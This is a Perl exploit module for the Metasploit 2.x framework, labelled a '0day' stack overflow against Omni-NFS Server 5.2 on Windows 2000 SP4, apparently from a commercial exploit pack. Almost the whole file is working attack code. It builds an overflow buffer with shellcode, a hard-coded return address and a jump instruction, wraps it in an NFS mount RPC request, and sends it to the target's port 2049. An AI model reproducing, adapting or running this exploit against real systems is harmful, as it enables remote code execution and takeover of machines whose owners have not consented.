# vd_xlink.pm
#
# The exploit is a part of VulnDisco Pack - use only under the license agreement
# specified in LICENSE.txt in your VulnDisco distribution

use strict;

package Msf::Exploit::vd_xlink;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info = 
{
	"Name"      => "[0day] Omni-NFS Server overflow",
    	"Version"   => "\$Revision: 1.0 \$",
    	"Authors"   => ["Evgeny Legerov"],
    	"Arch"      => ["x86"],
    	"OS"        => ["win32"],
    	"Priv"      => 1,
    	"UserOpts"  =>
                {
                	"RHOST" => [1, "ADDR", "The target address"],
                    	"RPORT" => [1, "PORT", "The target port", 2049],
                },

    	"Description" => Pex::Text::Freeform(q{
			Exploit for Omni-NFS Server stack overflow vulnerability.
		}),


   	"Payload" =>
        	{
                "Space"     => 427,
          	},

        "DefaultTarget"  => 0,
        "Targets"        =>
         	[
        		["Omni-NFS Server 5.2 (nfsd.exe: call ebx) / Windows 2000 SP4", 0x00401843]

         	],

        "Keys"           => ["vd_xlink"],
};

sub new	{
	my $class = shift;
	return $class->SUPER::new({"Info" => $info, "Advanced" => $advanced}, @_);
}

sub Exploit {
	my $self = shift;
        my $host = $self->GetVar("RHOST");
        my $port = $self->GetVar("RPORT");
	my $writedir = $self->GetVar("DIR");
	my $bind_port = $self->GetVar("LPORT");
	my $target = $self->Targets->[$self->GetVar("TARGET")];
	my $encodedPayload = $self->GetVar("EncodedPayload");
        my $shellcode   = $encodedPayload->Payload;

     	my $payload = "";
        $payload .= "\x4d" x 9;
        $payload .= $shellcode;
        $payload .= "\x4d" x (427 - length($shellcode));
        $payload .= "\x4d\x4d\x4d\x2d";
        $payload .= pack("V", $target->[1]);
        $payload .= "\xe9\x17\xfb\xff\xff"; # jmp $-1257
        $payload .= "\x45" x 351;

        my $s = "";
        $s .= pack("N", 1);
        $s .= pack("N", 0);
        $s .= pack("N", 2);
        $s .= pack("N", 100005);
        $s .= pack("N", 1);
        $s .= pack("N", 1);

        $s .= pack("N", 1);
        $s .= pack("N", 400);
        $s .= substr($payload, 0, 400);

        $s .= pack("N", 1);
        $s .= pack("N", 400);
        $s .= substr($payload, 400);

                
	my $req = pack("N", length($s) | 0x80000000) . $s;

  	my $sock = Msf::Socket::Tcp->new("PeerAddr" => $host, "PeerPort"  => $port);
        if ($sock->IsError) {
                $self->PrintLine("Error creating socket: " . $sock->GetError);
                return;
        }

	$sock->Send($req);
	
	sleep(3);

	$sock->Close();
}

__END__

